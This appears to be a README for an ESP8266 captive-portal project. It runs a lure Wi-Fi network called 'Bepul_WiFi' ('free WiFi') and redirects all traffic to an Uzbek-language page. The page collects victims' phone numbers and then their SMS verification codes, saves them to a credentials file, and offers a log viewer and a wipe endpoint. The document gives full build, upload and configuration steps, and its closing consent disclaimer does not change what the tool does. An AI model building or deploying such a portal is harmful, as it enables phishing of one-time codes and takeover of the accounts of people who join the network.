## Phone Verification Captive Portal (UZ)

A captive portal for ESP8266 that presents an Uzbek-language flow to collect a phone number and a 5‑digit verification code. Collected entries are appended to LittleFS at `/credentials.txt`. Includes a simple log viewer and clear endpoint.

### Features
- **Captive portal**: Wildcard DNS redirects all domains to the device
- **Access Point**: SSID `Bepul_WiFi`, IP `172.20.0.1`
- **Modern UI**: Uzbek phone input formatting `+998 12 345 67 89` with live validation
- **Endpoints**:
  - `GET /` (all not-found routes): phone entry page
  - `POST /phone`: store phone as `pending`, show SMS code page
  - `POST /verify`: store final code
  - `GET /logs`: view captured entries from LittleFS
  - `GET /clear`: delete `/credentials.txt`
- **LED feedback**: Built-in LED on `GPIO2/D4` flashes on key events

### Hardware
- **MCU**: ESP8266 family (e.g., NodeMCU 1.0 ESP‑12E, Wemos D1 mini)

### Required Software
- **Arduino IDE**: 2.x recommended
- **ESP8266 core**: Install via Boards Manager (ESP8266 by ESP8266 Community)

### Required Libraries
Install via Library Manager or GitHub (me-no-dev):
- `ESPAsyncWebServer`
- `ESPAsyncTCP` (ESP8266 variant)
- `DNSServer` (bundled with ESP8266 core)
- `LittleFS` (bundled with ESP8266 core)

If installing manually:
- ESPAsyncWebServer: `https://github.com/me-no-dev/ESPAsyncWebServer`
- ESPAsyncTCP (ESP8266): `https://github.com/me-no-dev/ESPAsyncTCP`

### Build and Upload
1. Open `PhoneVerificationPortal_UZ.ino` in Arduino IDE
2. Tools → Board: select your ESP8266 board (e.g., NodeMCU 1.0 (ESP‑12E))
3. Tools (common defaults):
   - Flash Size: 4M (3M FS) or similar
   - CPU Frequency: 80 MHz
   - Upload Speed: 921600 (or 115200 if unreliable)
4. Install the libraries listed above
5. Connect the board and click Upload

No filesystem data upload is required; the sketch creates `/credentials.txt` on first write.

### Usage
- Power the device; it starts an AP named `Bepul_WiFi` at `172.20.0.1`
- Connect from a phone/laptop; DNS will redirect to the phone entry page
- Enter phone in format `+998 12 345 67 89`; then enter the 5‑digit code
- Visit `http://172.20.0.1/logs` to view captured entries
- Visit `http://172.20.0.1/clear` to delete the stored entries

### Configuration
Edit constants at the top of `PhoneVerificationPortal_UZ.ino`:
- `AP_SSID`: change Wi‑Fi name
- `AP_IP`: change captive portal IP
- `CREDENTIALS_FILE`: change storage path (default `/credentials.txt`)
- `LED_PIN`: change LED GPIO (default `2`)

### Notes and Troubleshooting
- If you see missing headers (e.g., `ESPAsyncWebServer.h`), install the listed libraries and restart the IDE
- Use the ESP8266‑specific `ESPAsyncTCP` (not `AsyncTCP`, which is for ESP32)
- Ensure the ESP8266 core is updated via Boards Manager

### Legal and Ethical Use
This project can emulate a login portal and collect user input. Ensure you have explicit consent and comply with all applicable laws and policies. Use only in controlled environments for legitimate purposes.

### License
See the root `LICENSE` file of this repository
